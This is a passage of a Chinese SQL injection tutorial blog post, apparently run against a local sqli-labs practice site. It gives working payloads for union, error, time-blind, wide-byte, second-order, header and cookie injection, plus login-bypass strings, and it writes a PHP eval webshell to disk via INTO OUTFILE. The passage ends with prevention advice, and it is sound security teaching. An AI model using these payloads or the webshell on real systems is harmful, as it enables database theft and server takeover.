+<p>我们还可以通过union注入获得更多的信息。</p>
+<pre><code class="sql">// 获得所有的数据库 
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(schema_name),3 from information_schema.schemata#
+
+// 获得所有的表
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(table_name),3 from information_schema.tables#
+
+// 获得所有的列
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(column_name),3 from information_schema.columns#
+
+#获取当前数据库中指定表的指定字段的值(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(password),3 from users%23</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203200336271.png" alt="img"></p>
+<p>当我们已知当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; #</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203200148384.png" alt="img"></p>
+<p>我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每一个表中的列</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; #</code></pre>
+<p>如下，我们可以知道users表中有id，username，password三列</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203201654448.png" alt="img"></p>
+<p>我们知道存在users表，又知道表中有 id ，username， password三列，那么我们可以构造如下语句</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users #</code></pre>
+<p>我们就把users表中的所有数据都给爆出来了</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203201813924.png" alt="img"></p>
+<h2 id="三：文件读写"><a href="#三：文件读写" class="headerlink" title="三：文件读写"></a>三：文件读写</h2><p>当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
+<p>文件写入只能利用 union 注入</p>
+<p>示例：读取e盘下3.txt文件</p>
+<p>union注入读取文件</p>
+<pre><code class="sql">//union注入读取 e:/3.txt 文件
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;   union select 1,2,load_file(&quot;e:/3.txt&quot;)#
+
+//也可以把 e:/3.txt 转换成16进制 0x653a2f332e747874
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;   union select 1,2,load_file(0x653a2f332e747874)#</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203202108410.png" alt="img"></p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203202213731.png" alt="img"></p>
+<p>盲注读取文件</p>
+<pre><code class="sql">//盲注读取的话就是利用hex函数，将读取的字符串转换成16进制，再利用ascii函数，转换成ascii码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code></pre>
+<p>我们可以利用写入文件的功能，在e盘创建4.php文件，然后写入一句话木马</p>
+<p>union写入文件</p>
+<pre><code class="sql">//利用union注入写入一句话木马  into outfile 和 into dumpfile 都可以
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39;  into outfile  &#39;e:/4.php&#39; #
+
+// 可以将一句话木马转换成16进制的形式
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile  &#39;e:/4.php&#39; #</code></pre>
+<h2 id="四：报错注入"><a href="#四：报错注入" class="headerlink" title="四：报错注入"></a>四：报错注入</h2><p><strong>利用前提</strong>: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()<br><strong>优点</strong>: 不需要显示位<br><strong>缺点</strong>: 需要输出 mysql_error( )的报错信息</p>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>floor报错注入是利用 <strong>count()函数</strong> 、<strong>rand()函数</strong> 、<strong>floor()函数</strong> 、<strong>group by</strong> 这几个特定的函数结合在一起产生的注入漏洞。缺一不可</p>
+<pre><code class="sql">// 我们可以将 user() 改成任何函数，以获取我们想要的信息。具体可以看文章开头关于information_schema数据库的部分
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a) #
+
+//将其分解
+(select 1 from (Y)a)
+
+Y= select count(*) from information_schema.tables group by concat(Z)
+
+Z= user(),floor(rand(0)*2)           //将这里的 user() 替换成我们需要查询的函数</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203203203736.png" alt="img"></p>
+<p>floor报错注入参考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80650540</a></p>
+<h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><blockquote>
+<p>EXTRACTVALUE (XML_document, XPath_string)</p>
+</blockquote>
+<ul>
+<li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称</li>
+<li>第二个参数：XPath_string (Xpath 格式的字符串).</li>
+</ul>
+<p>作用：从目标 XML 中返回包含所查询值的字符串</p>
+<p>ps: 返回结果 限制在32位字符</p>
+<pre><code class="perl">// 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  and extractvalue(1,concat(0x7e,user(),0x7e))#
+
+// 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))#</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203203331591.png" alt="img"></p>
+<h3 id="UpdateXml报错注入"><a href="#UpdateXml报错注入" class="headerlink" title="UpdateXml报错注入"></a>UpdateXml报错注入</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码！</p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value)</p>
+</blockquote>
+<ul>
+<li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</li>
+<li>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</li>
+<li>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</li>
+</ul>
+<p>作用：改变文档中符合条件的节点的值</p>
+<pre><code class="perl">// 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  and updatexml(1,concat(0x7e,user(),0x7e),1)#
+
+// 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部
+http://127.0.0.1/sqli/Less-1/?id=-1&#39;  and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)#</code></pre>
+<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20181203223651972.png" alt="img"></h2><p>更多的关于报错注入的文章：<a href="https://blog.csdn.net/cyjmosthandsome/article/details/87947136" target="_blank" rel="noopener">https://blog.csdn.net/cyjmosthandsome/article/details/87947136</a></p>
+<p>​                                               <a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p>
+<h2 id="五：时间盲注"><a href="#五：时间盲注" class="headerlink" title="五：时间盲注"></a>五：时间盲注</h2><p>Timing Attack注入，也就是时间盲注。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
+<p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
+<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p>
+<table>
+<thead>
+<tr>
+<th>MySQL</th>
+<th>benchmark(100000000,md(5))sleep(3)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PostgreSQL</td>
+<td>PG_sleep(5)Generate_series(1,1000000)</td>
+</tr>
+<tr>
+<td>SQLServer</td>
+<td>waitfor delay  ‘0:0:5’</td>
+</tr>
+</tbody></table>
+<p><strong>利用前提：</strong>页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。<br><strong>优点：</strong>不需要显示位，不需要出错信息。<br><strong>缺点：</strong>速度慢，耗费大量时间</p>
+<p>sleep 函数判断页面响应时间               if(判断条件，为true时执行，为false时执行)</p>
+<p>我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息</p>
+<pre><code class="sql">//判断是否存在延时注入
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and sleep(5)#
+
+// 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #</code></pre>
+<h2 id="六：REGEXP正则匹配"><a href="#六：REGEXP正则匹配" class="headerlink" title="六：REGEXP正则匹配"></a>六：REGEXP正则匹配</h2><p>正则表达式，又称规则表达式（Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180823231241895.png" alt="img"></p>
+<p>查找name字段中含有a或者b的所有数据：        select name from admin where name regexp ‘ a|b ‘;<br>查找name字段中含有ab，且ab前有字符的所有数据(.匹配任意字符)： select name from admin where name regexp ‘ .ab ‘;<br>查找name字段中含有at或bt或ct的所有数据：   select name from admin where name regexp ‘ [abc]t ‘;<br>查找name字段中以a-z开头的所有数据：          select name from admin where name regexp ‘ ^[a-z] ‘;</p>
+<p>已知数据库名为 security，判断第一个表的表名是否以 a-z 中的字符开头，^[a-z]  –&gt;  ^a ; 判断出了第一个表的第一个字符，接着判断第一个表的第二个字符 ^a[a-z] –&gt;  ^ad ;  就这样，一步一步判断第一个表的表名  ^admin$ 。然后 limit 1，1 判断第二个表</p>
+<pre><code>// 判断security数据库下的第一个表的是否以a-z的字母开头
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and  1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^[a-z]&#39; limit 0,1) #</code></pre><p>参考文档：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
+<h2 id="七：宽字节注入"><a href="#七：宽字节注入" class="headerlink" title="七：宽字节注入"></a>七：宽字节注入</h2><p>宽字节注入是由于不同编码中中英文所占字符的不同所导致的。通常来说，在GBK编码当中，一个汉字占用2个字节。而在UTF-8编码中，一个汉字占用3个字节。在php中，我们可以通过输入 echo strlen(“中”) 来测试，当为GBK编码时，输入2，而为UTF-8编码时，输出3。除了GBK以外，所有的ANSI编码都是中文都是占用两个字节。</p>
+<p>相关文章：<a href="https://blog.csdn.net/qq_36119192/article/details/84138312" target="_blank" rel="noopener">字符集与字符编码</a></p>
+<p>在说之前，我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。</p>
+<p>addslashes()函数，这个函数在预定义字符之前添加反斜杠 \ 。预定义字符：  单引号 ‘ 、双引号 “ 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用 <strong>get_magic_quotes_gpc()</strong> 来检测是否已经转义。</p>
+<p>mysql_real_escape_string() 函数，这个函数用来转义sql语句中的特殊符号x00 、\n  、\r  、\  、‘  、“ 、x1a。</p>
+<p>魔术引号：当打开时，所有的单引号’、双引号”、反斜杠\ 和 NULL 字符都会被自动加上一个反斜线来进行转义，这个和 addslashes()函数的作用完全相同。所以，如果魔术引号打开了，就不要使用addslashes()函数了。一共有三个魔术引号指令。</p>
+<ol>
+<li>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。</li>
+<li>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</li>
+<li>magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ‘’。而双引号、反斜线 和 NULL 字符将不会进行转义。 如何取得其值参见 ini_get()</li>
+</ol>
+<p>我们这里搭了一个平台来测试，这里得感谢其他大佬的源码。</p>
+<p>测试代码及数据库：<a href="http://pan.baidu.com/s/1eQmUArw" target="_blank" rel="noopener">http://pan.baidu.com/s/1eQmUArw</a> 提取密码:75tu</p>
+<p>首先，我们来看一下1的源码，这对用户输入的id用 addslashes() 函数进行了处理，而且是当成字符串处理。</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824220434497.png" alt="img"></p>
+<p>我们输入 <a href="?id=1'"> http://127.0.0.1/1/1/?id=1’</a></p>
+<p>这里addslashes函数把我们的 ’ 进行了转义，转义成了 &#39;。</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824222606737.png" alt="img"></p>
+<p>所以，我们要想绕过这个转义，就得把 &#39; 的 \ 给去掉。那么怎么去掉呢。</p>
+<ol>
+<li>在转义之后，想办法让\前面再加一个\，或者偶数个\即可，这样就变成了\‘ ，\ 被转义了，而 ‘ 逃出了限制。</li>
+<li>在转义之后，想办法把 \ 弄没有，只留下一个 ‘ 。</li>
+</ol>
+<p>我们这里利用第2中方法，宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为两个字符是一个汉字，前提是前一个字符的 ASCII 值大于128，才会认为是汉字。</p>
+<p>当我们输入如下语句的时候，看看会发生什么。</p>
+<pre><code class="sql">127.0.0.1/1/1/?id=1%df&#39;</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/2018082422264819.png" alt="img"></p>
+<p>我们发现页面报错了，而且报错的那里是  ‘1運’’  。我们只输入了 1%df ‘ ，最后变成了 1運 ‘ 。所以是mysql把我们输入的%df和反斜杠\ 合成了一起，当成了 運 来处理。而我们输入的单引号’ 逃了出来，所以发生了报错。我们现在来仔细梳理一下思路。 我们输入了 1%df ’ ,而因为使用了addslashes()函数处理 ‘，所以最后变成了 1%df&#39; , 又因为会进行URL编码，所以最后变成了 1%df%5c%27 。而MySQL正是把%df%5c当成了汉字 運 来处理，所以最后 %27 也就是单引号逃脱了出来，这样就发生了报错。而这里我们不仅只是能输入%df ，我们只要输入的数据的ASCII码大于128就可以。因为在MySQL中只有当前一个字符的ASCII大于128，才会认为两个字符是一个汉字。所以只要我们输入的数据大于等于 %81 就可以使 ‘ 逃脱出来了。</p>
+<p>知道怎么绕过，我们就可以进行注入获得我们想要的信息了！</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824224749709.png" alt="img"></p>
+<p>既然GBK编码可以，那么GB2312可不可以呢？怀着这样的好奇，我们把数据库编码改成了GB2312，再次进行了测试。我们发现，当我们再次利用输入 1%df’ 的时候，页面竟然不报错，那么这是为什么呢？</p>
+<p>这要归结于GB2312编码的取值范围。它编码的取值范围高位是0XA1<del>0XF7，低位是0XA1</del>0xFE,而 \ 是0x5C ，不在低位范围中。所以0x5c根本不是GB2312中的编码。所以，%5c 自然不会被当成中文的一部分给吃掉了。</p>
+<p>所以，通过这个我们可以得到结论，在所有的编码当中，只要低位范围中含有 0x5C的编码，就可以进行宽字符注入。</p>
+<p>发现了这个宽字符注入，于是很多程序猿把 <strong>addslashes()</strong> 函数换成了 <strong>mysql_real_escape_string()</strong> 函数，想用此来抵御宽字节的注入。因为php官方文档说了这个函数会考虑到连接的当前字符集。</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824230340194.png" alt="img"></p>
+<p>那么，使用了这个函数是否就可以抵御宽字符注入呢。我们测试一下，我们输入下面的语句</p>
+<pre><code>http://127.0.0.1/1/3/?id=1%df&#39;</code></pre><p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824230625577.png" alt="img"></p>
+<p>发现还是能进行宽字节的注入。那么这是为什么呢？原因就是，你没有指定php连接mysql的字符集。我们需要在执行SQL语句之前调用 <strong>mysql_set_charse</strong>t 函数，并且设置当前连接的字符集为gbk。</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825100303626.png" alt="img"></p>
+<p>这样当我们再次输入的时候，就不能进行宽字节注入了！</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824231223744.png" alt="img"></p>
+<p><strong>宽字节注入的修复</strong></p>
+<p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset=(‘gbk’,$conn)</strong> 。这个方法是可行的。但是还是有很多网站是使用的addslashes()函数进行过滤，我们不可能把所有的addslashes()函数都换成mysql_real_escape_string()。</p>
+<p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p>
+<pre><code class="sql">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </code></pre>
+<p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825102304200.png" alt="img"></p>
+<h2 id="八：堆叠注入"><a href="#八：堆叠注入" class="headerlink" title="八：堆叠注入"></a>八：堆叠注入</h2><p>在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 ; 结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root’;DROP database  user；服务器端生成的sql语句为：Select * from user where name=’root’;DROP database user；当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。</p>
+<p>参考：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">SQL注入-堆叠注入（堆查询注入）</a></p>
+<p>​          <a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">SQL Injection8(堆叠注入)——强网杯2019随便注</a></p>
+<h2 id="九：二次注入"><a href="#九：二次注入" class="headerlink" title="九：二次注入"></a>九：二次注入</h2><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p>
+<ol>
+<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li>
+<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
+<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
+<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li>
+<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li>
+</ol>
+<p>我们访问 <a href="http://127.0.0.1/sqli/Less-24/index.php" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-24/index.php</a></p>
+<p>是一个登陆页面，我们没有账号，所以选择新建一个用户</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204091524714.png" alt="img"></p>
+<p>我们新建的用户名为：<strong>admin’#</strong>   密码为：<strong>123456</strong></p>
+<p>查看数据库，可以看到，我们的数据插入进去了</p>
+<p><img src="https://img-blog.csdnimg.cn/20181204091947970.png" alt="img"></p>
+<p>我们使用新建的用户名和密码登录</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204092025954.png" alt="img"></p>
+<p>登录成功了，跳转到了后台页面修改密码页面。</p>
+<p>我们修改用户名为：admin’#   密码为：aaaaaaaaa</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204092220974.png" alt="img"></p>
+<p>提示密码更新成功！</p>
+<p><img src="https://img-blog.csdnimg.cn/20181204092249574.png" alt="img"></p>
+<p>我们查看数据库，发现用户 <strong>admin’#</strong> 的密码并没有修改，而且 admin 用户的密码修改为了  aaaaaaaaaa</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/2018120409241396.png" alt="img"></p>
+<p>那么，为什么会这样呢？我们查看修改密码页面源代码，发现这里存在明显的SQL注入漏洞</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204093108151.png" alt="img"></p>
+<p>当我们提交用户名  admin’# 修改密码为 aaaaaaaaaa 的时候，这条SQL语句就变成了下面的语句了。</p>
+<p>#把后面的都给注释了，所以就是修改了admin用户的密码为 aaaaaaaaaa</p>
+<pre><code class="perl">$sql = &quot;UPDATE users SET PASSWORD=&#39;aaaaaaaaaa&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre>
+<h2 id="十：User-Agent注入"><a href="#十：User-Agent注入" class="headerlink" title="十：User-Agent注入"></a>十：User-Agent注入</h2><p>我们访问 <a href="http://127.0.0.1/sqli/Less-18/" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-18/</a> ，页面显示一个登陆框和我们的ip信息</p>
+<p>当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204101917617.png" alt="img"></p>
+<p>抓包，修改其User-Agent为</p>
+<pre><code class="perl">&#39;and extractvalue(1,concat(0x7e,database(),0x7e))and &#39;1&#39;=&#39;1  #我们可以将 database()修改为任何的函数</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204103040569.png" alt="img"></p>
+<p>可以看到，页面将当前的数据库显示出来了</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181204103135508.png" alt="img"></p>
+<h2 id="十一：Cookie注入"><a href="#十一：Cookie注入" class="headerlink" title="十一：Cookie注入"></a>十一：Cookie注入</h2><p>如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。</p>
+<p>但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值，这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。</p>
+<p>我们这里有一个连接：<a href="http://www.xx.com/search.asp?id=1" target="_blank" rel="noopener">www.xx.com/search.asp?id=1</a> </p>
+<p>我们访问：<a href="http://www.xx.com/srarch.asp" target="_blank" rel="noopener">www.xx.com/srarch.asp</a>　发现不能访问，说缺少id参数。</p>
+<p>我们将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。</p>
+<p>那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！</p>
+<h2 id="十二：过滤绕过"><a href="#十二：过滤绕过" class="headerlink" title="十二：过滤绕过"></a>十二<strong>：过滤绕过</strong></h2><p>传送门：待更新</p>
+<h2 id="十三：传说中的万能密码"><a href="#十三：传说中的万能密码" class="headerlink" title="十三：传说中的万能密码"></a>十三：传说中的万能密码</h2><p>sql=”select*from test where username=’ XX ‘  and password=’ XX ‘  “;</p>
+<ul>
+<li>admin’ or ‘1’=’1                  XX         //万能密码(已知用户名)</li>
+<li>XX                                  ‘or’1’=’1     //万能密码(不需要知道用户名)</li>
+<li>‘or ‘1’=’1’#                          XX         //万能密码(不知道用户名)</li>
+</ul>
+<h1 id="SQL注入的预防"><a href="#SQL注入的预防" class="headerlink" title="SQL注入的预防"></a>SQL注入的预防</h1><p>既然SQL注入的危害那么大，那么我们要如何预防SQL注入呢？</p>
+<h2 id="1-预编译-PreparedStatement-JSP"><a href="#1-预编译-PreparedStatement-JSP" class="headerlink" title="(1)预编译(PreparedStatement)(JSP)"></a>(1)预编译(<strong>PreparedStatement</strong>)(JSP)</h2><p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
+<pre><code class="java"> String sql = &quot;select id, no from user where id=?&quot;;
+ PreparedStatement ps = conn.prepareStatement(sql);
+ ps.setInt(1, id);
+ ps.executeQuery();</code></pre>
+<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
+<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该SQL语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析SQL命令，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面输入了这些SQL命令，也不会被当成SQL命令来执行了，因为这些SQL命令的执行， 必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，<strong>只会被当做字符串字面值参数</strong>。所以SQL语句预编译可以有效防御SQL注入。</p>
+<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
+<h2 id="2-PDO-PHP"><a href="#2-PDO-PHP" class="headerlink" title="(2)PDO(PHP)"></a>(2)PDO(PHP)</h2><p>首先简单介绍一下什么是PDO。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
+<p>PDO对于解决SQL注入的原理也是基于预编译。</p>
+<pre><code class="php">$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); 
+$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); 
+$data-&gt;execute();</code></pre>
+<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了占位符的方式，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以防止传那些危险变量改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行，</p>
+<h2 id="3-使用正则表达式过滤"><a href="#3-使用正则表达式过滤" class="headerlink" title="(3)使用正则表达式过滤"></a>(3)使用正则表达式过滤</h2><p>虽然预编译可以有效预防SQL注，但是某些特定场景下，可能需要拼接用户输入的数据。这种情况下，我们就需要对用户输入的数据进行严格的检查，使用正则表达式对危险字符串进行过滤，这种方法是基于黑名单的过滤，以至于黑客想尽一切办法进行绕过注入。基于正则表达式的过滤方法还是不安全的，因为还存在绕过的风险。</p>
+<p>对用户输入的特殊字符进行严格过滤，如  ’、”、&lt;、&gt;、/、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180824085908682.png" alt="img"></p>
+<h2 id="4-其他"><a href="#4-其他" class="headerlink" title="(4) 其他"></a>(4) 其他</h2><ul>
+<li>Web 应用中用于连接数据库的用户与数据库的系统管理员用户的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库</li>
